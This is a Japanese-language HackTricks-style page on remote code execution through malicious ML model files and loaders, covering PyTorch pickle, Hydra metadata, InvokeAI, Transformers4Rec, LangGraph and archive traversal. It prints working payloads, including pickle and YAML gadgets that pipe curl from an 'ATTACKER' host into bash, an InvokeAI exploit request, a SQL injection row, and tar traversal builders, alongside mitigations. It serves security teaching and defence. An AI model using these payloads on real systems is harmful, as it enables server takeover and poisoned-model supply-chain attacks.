# モデル RCE

{{#include ../banners/hacktricks-training.md}}

## RCEのためのモデル読み込み

Machine Learningモデルは通常、ONNX、TensorFlow、PyTorchなど、さまざまな形式で共有されます。これらのモデルは、開発者のマシンやproduction systemsに読み込まれて使用されます。通常、モデルにmalicious codeが含まれているべきではありませんが、意図されたfeatureとして、またはモデル読み込みlibraryのvulnerabilityによって、モデルを使用してsystem上でarbitrary codeを実行できる場合があります。

執筆時点で、このタイプのvulnerabilitiesの例には以下があります。

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルcheckpoint内のmalicious pickleによりcode executionが発生（`weights_only` safeguardをbypass）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model downloadによりcode executionが発生。management APIでJava deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`によるUnsafe checkpoint deserialization **(CVE-2025-23298)**                                           | 信頼できないcheckpointが`load_model_trainer_states_from_checkpoint`中にpickle reducerをtriggerし、ML workerでcode executionを引き起こす            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlledな`filter` keyにSQL/JSON-path syntaxをinjectし、`UNION SELECT`でfake checkpoint rowを作成。その後、`msgpack` deserializationがattacker指定のPython codeをimportしてcallする | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルを読み込む際に`yaml.unsafe_load`が使用される（code exec） <br> **Lambda** layerを含むモデルの読み込みでarbitrary Python codeが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` modelがinteger overflowをtriggerし、heap corruptionを引き起こす（potential RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`経由でモデルを読み込むと、attackerの`__reduce__` payloadを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`のdefault設定ではpickled object arraysが許可されていたため、malicious `.npy/.npz`がcode execをtriggerする                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelのexternal-weights pathがdirectoryの外部にescapeできる（arbitrary filesをread） <br> Malicious ONNX model tarがarbitrary filesをoverwriteできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operatorを含むモデルではattackerのnative codeのloadingが必要。複雑なmodel graphsがlogicをabuseし、意図しないcomputationsを実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`を有効にしてmodel-load APIを使用すると、relative path traversalによってfilesを書き込める（例：RCEのために`.bashrc`をoverwrite）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model fileがparser内でheap buffer overflowsを引き起こし、victim systemでarbitrary code executionを可能にする                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layerを含むmalicious HDF5（`.h5`）modelのcodeはload時にも実行される（Keras safe_modeはold formatを対象としない ― “downgrade attack”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのML tools（例：pickle-based model formats、Python `pickle.load`）は、mitigationされていない限り、model filesに埋め込まれたarbitrary codeを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlledなmodel metadata/configが`_target_`をarbitrary callable（例：`builtins.exec`）に設定し、“safe” formats（`.safetensors`、`.nemo`、repo `config.json`）であってもload中に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるもののように、`weights_only=True`で読み込まれない場合にsystem上でarbitrary codeを実行するために悪用できる、Python pickleベースのモデルもあります。そのため、pickleベースのモデルは、上のtableに記載されていない場合でも、このタイプのattacksに特にsusceptibleである可能性があります。

### Hydra metadata → RCE（safetensorsでも動作）

`hydra.utils.instantiate()`は、configuration/metadata object内の任意のdotted `_target_`をimportしてcallします。librariesが**untrusted model metadata**を`instantiate()`に渡す場合、attackerはmodel load中に即座に実行されるcallableとargumentsを指定できます（pickleは不要）。<sup>[[12]](#references)</sup>

Payload example（`.nemo`の`model_config.yaml`、repoの`config.json`、または`.safetensors`内の`__metadata__`で動作）：
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS の HuggingFace coders、FlexTok loaders で、model initialization より前に trigger される。
- Hydra の string block-list は、alternative import paths（例: `enum.bltns.eval`）や、application-resolved names（例: `nemo.core.classes.common.os.system` → `posix`）によって bypass 可能。
- FlexTok は `ast.literal_eval` を使って stringified metadata も parse するため、Hydra call より前に DoS（CPU/memory blowup）が発生する可能性がある。

### 🆕 `torch.load` による InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は Stable-Diffusion 用の人気のある open-source web interface。バージョン **5.3.1 – 5.4.2** では、ユーザーが任意の URL から model を download して load できる REST endpoint `/api/v2/models/install` が公開されている。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に以下を call する:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
供給されたファイルが **PyTorch checkpoint（`*.ckpt`）** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツは user-controlled URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意のあるオブジェクトを埋め込めます。このメソッドは **deserialization 中に** 実行され、InvokeAI server 上で **remote code execution（RCE）** につながります。

この vulnerability には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。

#### Exploitation の手順

1. 悪意のある checkpoint を作成します:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 管理下の HTTP server（例: `http://ATTACKER/payload.ckpt`）で `payload.ckpt` をホストします。
3. 脆弱な endpoint をトリガーします（認証は不要です）。
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストで code execution を取得します。

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の処理全体を自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルト値は **false**）
•  `/api/v2/models/install` に攻撃者が到達可能である
•  プロセスに shell commands を実行する権限がある

#### Mitigations

* **InvokeAI ≥ 5.4.3** にアップグレードする - patch によりデフォルトで `scan=True` が設定され、deserialization 前に malware scanning が実行されます。
* プログラムから checkpoints を読み込む場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* model sources に対して allow-lists / signatures を適用し、service を least-privilege で実行します。

> ⚠️ 信頼できない sources から deserialization する場合、（多数の `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）Python pickle-based format は **すべて** 本質的に unsafe であることを忘れないでください。

---

古い InvokeAI versions を reverse proxy の背後で稼働させ続ける必要がある場合の ad-hoc mitigation の例:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec の unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）は、ユーザーが指定したパスに対して直接 `torch.load()` を呼び出す unsafe な checkpoint loader を公開していました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint によって、デシリアライズ中に reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

これが RCE につながる理由: Python の pickle では、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義し、callable と引数を返すことができます。callable は unpickling 中に実行されます。そのようなオブジェクトが checkpoint に含まれている場合、weights が使用される前に実行されます。

最小限の malicious checkpoint の例:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors と blast radius:
- repos、buckets、または artifact registries 経由で共有される Trojanized checkpoints/models
- checkpoints を自動的にロードする Automated resume/deploy pipelines
- 実行は training/inference workers 内部で行われ、多くの場合 elevated privileges（例: containers 内の root）を持つ

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）により、直接的な `torch.load()` が、`transformers4rec/utils/serialization.py` に実装された制限付きの allow-listed deserializer に置き換えられた。新しい loader は types/fields を検証し、load 中に arbitrary callables が呼び出されることを防止する。<sup>[[7]](#references)</sup>

PyTorch checkpoints に特化した Defensive guidance:
- untrusted data を unpickle しない。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX などの non-executable formats を優先する。
- PyTorch serialization を使用する必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を確実に使用するか、Transformers4Rec の patch と同様の custom allow-listed unpickler を使用する。
- model provenance/signatures を適用し、deserialization を sandbox 化する（seccomp/AppArmor、non-root user、restricted FS、network egress なし）。
- checkpoint load 時に ML services から予期しない child processes が生成されていないか監視する。`torch.load()`/`pickle` の使用状況を trace する。

POC and vulnerable/patch references:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルを読み込む:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザーが制御できるデータを deserialize する `resnet` endpoint を公開しています。ZDI は、remote attacker が被害者に悪意のある page/file を load させ、その endpoint に細工した serialized blob を送信させることで、`root` として deserialization を実行させ、完全な compromise につなげられることを確認しました。

この exploit flow は、典型的な pickle abuse を踏襲しています：
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
デシリアライズ中に到達可能なあらゆる gadget（constructor、`__setstate__`、framework callback など）は、transport が HTTP、WebSocket、または監視対象ディレクトリに配置された file のいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この attack chain が興味深いのは、attacker が **malicious model file を upload する必要がない** 点です。代わりに、application は **AI-agent persistence API**（`get_state_history(..., filter=...)`）を公開しており、user input が checkpointer query builder に到達します。

#### 1. Structural SQLi in metadata filters

脆弱な SQLite pattern は次のようなものでした：
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
値は後から bind されますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` が `'$.{query_key}'` の外側に抜け出し、SQL を inject します。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。placeholders が保護するのは values だけであり、query syntax の構造部分は保護しません。

#### 2. `UNION SELECT` は data theft だけでなく、downstream sinks も標的にできる

この query は `type` と serialized `checkpoint` bytes を返し、それらは後で次のように利用されます:
```python
self.serde.loads_typed((type, checkpoint))
```
つまり、`WHERE`句のSQLiにより、**偽の結果行**を注入できます：
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
後続のコードが選択したカラムを parse、deserialize、write、または execute する場合、それらのカラムを対応する sink にマッピングします。この場合、fake row によって SQLi が **攻撃者制御の deserialization** に変わります。

#### 3. Unsafe MessagePack extension hooks は code gadgets と同等

LangGraph の `msgpack` path では、ネストされた tuple を unpack して実行する custom extension hook が使用されていました：
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
そのため、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` をimportし、`system` を解決してコマンドを実行します。AI frameworksをreviewする際は、dynamic imports、reflection、または任意のcallable dispatchに対応する **custom MessagePack/JSON/pickle revivers** を調査してください。

#### 4. agent frameworksの実践的なauditパターン

以下に到達する、user-controlled inputをreviewしてください:
- state history / memory / replay / checkpoint listing APIs
- SQLまたはRedis query fragmentsを生成するstructured filter builders
- custom deserializers（`pickle`、`msgpack`、`json` object hooks、YAML constructors）
- persistence layerから返されたrowsを信頼するrecovery paths

この特定のchainは、untrusted usersが`filter`をcontrolできるself-hosted LangGraph deploymentsのうち、**SQLite**または**Redis** checkpointersを使用しているものに影響しました。disclosureで記載されたpatched versionsは、`langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、および`langgraph-checkpoint 4.0.1+`です。<sup>[[15]](#references)</sup>

## ModelsからPath Traversalへ

[**このblog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で説明されているように、さまざまなAI frameworksで使用されるmodel formatsの多くはarchivesをベースとしており、通常は`.zip`です。そのため、これらのformatsを悪用してPath Traversal attacksを実行し、modelがloadされるsystemから任意のfilesを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、以下のcodeを使用すると、load時に`/tmp` directory内へfileを作成するmodelを作成できます:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
また、以下のコードを使うと、ロード時に`/tmp`ディレクトリへのsymlinkを作成するmodelを作成できます。
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深掘り: Keras .keras の deserialization と gadget hunting

.keras の内部構造、Lambda-layer RCE、3.8 以下における arbitrary import の問題、および修正後に allowlist 内で gadget を発見する方法についての詳細なガイドは、以下を参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考資料

- [1] [OffSec blog - 「CVE-2024-12029 - InvokeAI における信頼できないデータの deserialization」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI の patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module のドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch - torch.load の security considerations](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog - 「CVE-2025-23298: NVIDIA Merlin で Remote Code Execution を取得する」](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec の patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [修正前の vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [修正後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 - 最新の AI/ML format と library における Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE に関する warning)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research - SQLi から RCE へ: LangGraph の Checkpointer の exploit](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip Bug を High-Value AI/ML Bounty へ Pivoting](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
